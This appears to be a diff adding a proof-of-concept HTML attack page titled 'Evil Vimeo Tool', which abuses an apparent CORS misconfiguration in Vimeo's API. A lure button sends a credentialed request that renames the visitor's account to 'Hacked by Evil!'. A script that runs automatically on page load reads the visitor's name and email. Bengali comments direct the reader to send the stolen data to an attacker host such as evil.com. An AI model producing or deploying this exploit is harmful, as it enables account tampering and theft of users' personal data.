@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head><title>Evil Vimeo Tool</title></head>
+<body>
+    <h1>Click to Update Your Vimeo Name!</h1>
+    <button onclick="exploitVimeo()">Update Name to "Hacked by Evil!"</button>
+    <div id="result"></div>
+
+    <script>
+    async function exploitVimeo() {
+        const resultDiv = document.getElementById('result');
+        try {
+            // PATCH request to update name (তোমার demo-এর মতো)
+            const response = await fetch('https://api.vimeo.com/me?fields=name', {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': 'Bearer YOUR_JWT_TOKEN_HERE',  // যদি JWT manually extract করা যায় (e.g., dev tools থেকে), নাহলে omit করো—cookie auto-send হবে
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/vnd.vimeo.*; version=3.4.2'
+                },
+                credentials: 'include',  // Cookies/JWT auto-include করার জন্য (CORS allow করায় work করবে)
+                body: JSON.stringify({ name: 'Hacked by Evil!' })
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                resultDiv.innerHTML = `<p>Success! New name: ${data.name}</p>`;
+            } else {
+                resultDiv.innerHTML = `<p>Error: ${response.status}</p>`;
+            }
+        } catch (error) {
+            resultDiv.innerHTML = `<p>CORS Exploit Failed: ${error.message}</p>`;
+        }
+    }
+
+    // Auto-run on load: Read user info (e.g., steal name)
+    async function stealUserInfo() {
+        try {
+            const response = await fetch('https://api.vimeo.com/me?fields=name,email', {
+                credentials: 'include',
+                headers: { 'Accept': 'application/vnd.vimeo.*; version=3.4.2' }
+            });
+            const data = await response.json();
+            // এখানে data (name, email) attacker-এর server-এ send করো (e.g., fetch to evil.com/log)
+            console.log('Stolen:', data);  // Real-এ exfiltrate করো
+        } catch (e) { console.log(e); }
+    }
+    stealUserInfo();  // Page load-এ auto run
+    </script>
+</body>
+</html>
